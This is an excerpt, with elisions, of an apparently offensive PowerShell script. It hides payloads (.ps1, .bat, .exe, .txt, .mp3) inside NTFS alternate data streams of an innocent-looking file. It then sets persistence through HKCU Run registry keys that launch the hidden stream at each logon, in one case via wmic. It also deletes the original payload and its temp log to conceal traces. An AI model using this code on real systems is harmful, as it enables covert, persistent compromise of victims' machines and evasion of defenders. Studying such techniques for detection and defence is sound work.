...
.OUTPUTS
   [ads] Legit Image : C:\Users\pedro\Coding\ADS_TUTORIAL\blitzo.png
   [ads] payload path: C:\Users\pedro\Coding\ADS_TUTORIAL\payload.exe
...
ElseIf($ADS -ieq "Create")
{
    ...
    If($ParseDataName -Match '.ps1$')
    {
        ...
        echo "[ads] Legit File  : $InTextFile" >> $Env:TMP\gdfdod.log
        echo "[ads] payload path: $StreamData" >> $Env:TMP\gdfdod.log
        ...
        Get-Content -Path "$Env:TMP\gdfdod.log"|Format-List|Out-String -Stream|ForEach-Object {
           $stringformat = If($_ -iMatch 'Legit File')
           {
        ...
        If($Registry -ieq "True")
        {
           ...
           New-ItemProperty -Path "$path1" -Name 'ADSpersistencePS' -Value "powershell .\${InTextFile}:${ParseDataName}" -PropertyType String -Force
        }
    }
    ElseIf($ParseDataName -Match '.bat$')
    {
        ...
        Remove-Item -Path "$StreamData" -Force #Delete payload
        Remove-Item -Path "$Env:TMP\gdfdod.log" -Force
        ...
        If($Registry -ieq "True")
        {
           #Add to registry RUN
           $path1 = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceBAT' -Value "cmd /R `"cmd.exe - < ${InTextFile}:${ParseDataName}`"" -PropertyType String -Force
        }
    }
    ElseIf($ParseDataName -Match '.txt$')
    {
        ...
        If($Registry -ieq "True")
        {
           #Add to registry RUN
           $path1 = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceTXT' -Value "cmd /R notepad.exe ${InTextFile}:${ParseDataName}" -PropertyType String -Force
        }
    }
    ElseIf($ParseDataName -Match '.exe$')
    {
        ...
        If($Registry -ieq "True")
        {
           #Add to registry RUN
           $path1 = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceEXE' -Value "cmd /R wmic.exe process call create `"${InTextFile}:${ParseDataName}`"" -PropertyType String -Force
        }
    }
    ElseIf($ParseDataName -Match '.mp3$')
    {
        ...
        If($Registry -ieq "True")
        {
           #Add to registry RUN
           $path1 = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceMP3' -Value "cmd /R wmplayer.exe `"${InTextFile}:${ParseDataName}`"" -PropertyType String -Force
        }
    }
